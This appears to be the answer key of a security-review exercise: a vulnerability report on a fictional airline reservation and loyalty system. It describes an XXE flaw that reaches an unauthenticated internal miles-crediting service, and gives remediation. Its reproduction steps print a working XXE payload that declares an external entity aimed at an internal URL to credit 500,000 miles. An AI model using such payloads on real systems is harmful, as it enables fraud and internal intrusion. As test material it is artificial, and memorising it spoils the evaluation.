# Expected Response

## System
- **Name:** AeroSync Global Passenger Service System (PSS)
- **Domain:** Aviation / Airline Reservations / Loyalty Management
- **Document version analysed:** 14.1.0 (FINAL) + implementation doc 8.2.1

---

## Priority Findings

### Finding 1 — XXE via Legacy B2B XML Endpoint: Confused Deputy Forces Internal Loyalty Service Call (Pattern 7.1 — XXE / SSRF via XML external entity)
**Severity:** Critical / Financial Fraud (Fraudulent Miles Accrual)
**Affected endpoint:** `POST https://api.aerosync.com/b2b/soap/v1/AvailabilityQuery`
**Referenced in context:** Section 4.0 (RISK-AVIA-812), Section 6.0 (Java controller), Section 7.0 (XML payloads), HAR trace

**Summary:**
The legacy Java Booking Controller (`LegacyBookingController`, Section 6.0) uses `DocumentBuilderFactory` to parse attacker-supplied XML. Three critical security features are explicitly commented out in the code:
```java
// dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
// dbf.setFeature("http://xml.org/sax/features/external-general-entities", false);
// dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false);
```
With these features disabled, the Java process resolves `<!ENTITY ... SYSTEM "...">` declarations by making an outbound HTTP GET request to the specified URI during XML parsing.

The attacker injects a `DOCTYPE` with an entity pointing to the internal unauthenticated Loyalty service (Section 6.0 Go code):
```
http://loyalty-svc.internal:8080/internal/v1/accounts/10045299/add-miles?amount=500000
```
When the Java parser evaluates `&inject;` inside `<FlightNumber>`, it makes this internal GET request. The Legacy Booking Engine (running inside the Kubernetes cluster) is trusted by the Loyalty service's network policy, so the request is accepted and 500,000 miles are credited to account `10045299`.

**Critical evidence from HAR — attack succeeds despite 500 error:**
The HTTP response code is `500 Internal Server Error`, but the response body contains:
```
Cannot cast '{"status": "MILES_CREDITED"}' to valid FlightNumber format (e.g., AS-123)
```
This error message proves the internal Loyalty service was reached and returned `{"status": "MILES_CREDITED"}` before the casting exception occurred. The miles were permanently credited to the account before the error was thrown. The 500 status code is a false indicator of failure — the attack fully succeeded.

---

### Finding 2 — Unauthenticated Internal Service: Loyalty `add-miles` Endpoint Trusts Network Perimeter (Pattern 1.3 — Authorization missing on function level)
**Severity:** High / Fraudulent Financial State Manipulation
**Affected endpoint:** `GET http://loyalty-svc.internal:8080/internal/v1/accounts/{account_number}/add-miles`
**Referenced in context:** Section 6.0 (Go service code), Section 4.0 (attack narrative)

**Summary:**
The Go Loyalty service (`AddMilesInternal`, Section 6.0) executes a direct `UPDATE loyalty_accounts SET total_miles_balance = total_miles_balance + $1` based purely on URL path and query parameters. The code comment explicitly documents the trust assumption: *"Trusting the network boundary instead of explicitly authenticating the caller."* The service has no mechanism to verify that the caller is a legitimate internal microservice (no mTLS, no service account token, no API key). Any request that reaches the internal Kubernetes network — including an XXE-driven request from the Java Booking Engine — is unconditionally accepted.

---

## Evidence Map

| Artifact location | Finding 1 (XXE Confused Deputy) | Finding 2 (Unauth Internal Service) |
|---|---|---|
| Section 4.0 / RISK-AVIA-812 | Legacy DOM parser co-located with microservices | Internal loyalty service on shared cluster network |
| Section 6.0 Java code | `disallow-doctype-decl` disabled; external entities enabled | — |
| Section 6.0 Go code | Internal endpoint called via entity expansion | No auth check; trusts network boundary |
| Section 7.0 malicious XML | DOCTYPE + ENTITY SYSTEM targeting `loyalty-svc.internal` | account `10045299` + `amount=500000` in URL |
| HAR request body | Full malicious XML with DOCTYPE injection | — |
| HAR request API key | `ak_agency_77182X_live` — legitimate B2B agency key used | — |
| HAR response code | `500` — error occurred but attack already succeeded | — |
| HAR response body | `"MILES_CREDITED"` string in error message confirms internal service responded | — |

---

## Steps to Reproduce

### Finding 1 — XXE via SOAP Endpoint

**Step 1 — Verify normal B2B baseline**
```
POST https://api.aerosync.com/b2b/soap/v1/AvailabilityQuery
X-API-Key: ak_agency_77182X_live
Content-Type: application/xml

<?xml version="1.0" encoding="UTF-8"?>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Header/>
   <soapenv:Body>
      <AvailabilityQuery>
         <Origin>JFK</Origin>
         <Destination>LHR</Destination>
         <Date>2026-10-15</Date>
         <FlightNumber>AS-882</FlightNumber>
      </AvailabilityQuery>
   </soapenv:Body>
</soapenv:Envelope>
```
Expected baseline: `200 OK` with `<Response><Status>AVAILABLE</Status></Response>`.

**Step 2 — Submit XXE payload targeting internal Loyalty service (exact HAR replay)**
```
POST https://api.aerosync.com/b2b/soap/v1/AvailabilityQuery
X-API-Key: ak_agency_77182X_live
Content-Type: application/xml
User-Agent: TravelAggregator/2.0

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE soapenv:Envelope [
  <!ENTITY inject SYSTEM "http://loyalty-svc.internal:8080/internal/v1/accounts/10045299/add-miles?amount=500000">
]>
<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
   <soapenv:Header/>
   <soapenv:Body>
      <AvailabilityQuery>
         <Origin>JFK</Origin>
         <Destination>LHR</Destination>
         <Date>2026-10-15</Date>
         <FlightNumber>&inject;</FlightNumber>
      </AvailabilityQuery>
   </soapenv:Body>
</soapenv:Envelope>
```
**Vulnerable outcome (confirmed by HAR):**
- Response: `500 Internal Server Error`
- Response body contains: `Cannot cast '{"status": "MILES_CREDITED"}' to valid FlightNumber format`
- The `MILES_CREDITED` string in the error message proves the internal Loyalty service executed the miles credit before the casting exception
- The response code `500` does **not** indicate the attack failed — it indicates the attack succeeded and then the downstream parser failed on the returned data

**Secure outcome:**
- `400 Bad Request` with a generic XML error: `<Error>DOCTYPE declarations are not permitted.</Error>` — thrown before any entity resolution
- No outbound internal HTTP request is made

**Step 3 — Verify miles were credited (post-exploitation confirmation)**
Log in to the AeroSync mobile app as loyalty account `10045299`. Check the `mileage_ledger` via the mobile app's balance endpoint. If the attack succeeded, the `total_miles_balance` will have increased by 500,000 miles and a new `ADJUST_INTERNAL` ledger entry with `source_system: B2B_BOOKING_ENGINE` will appear.

---

## Remediation

**Finding 1 (XXE):**
1. Enable DOCTYPE blocking in the Java DocumentBuilderFactory — restore the three commented-out lines in the constructor:
   - `dbf.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`
   - `dbf.setFeature("http://xml.org/sax/features/external-general-entities", false)`
   - `dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", false)`
2. Validate `FlightNumber` format (e.g., regex `^[A-Z]{2}-\d{1,4}$`) before using it in downstream queries.

**Finding 2 (Unauthenticated Internal Service):**
1. Add service-to-service authentication to the Loyalty `add-miles` endpoint — require a Kubernetes service account token or a shared internal API key that only the legitimate Booking Engine and Admin Tool hold.
2. The internal endpoint currently accepts a state-changing `GET` request (`add-miles?amount=...`). Convert it to a `POST` with a structured body and require a valid caller identity claim.
3. Enforce Kubernetes NetworkPolicy so only the `booking-engine` service account can call `loyalty-svc.internal:8080` on the `/internal/v1/` path.
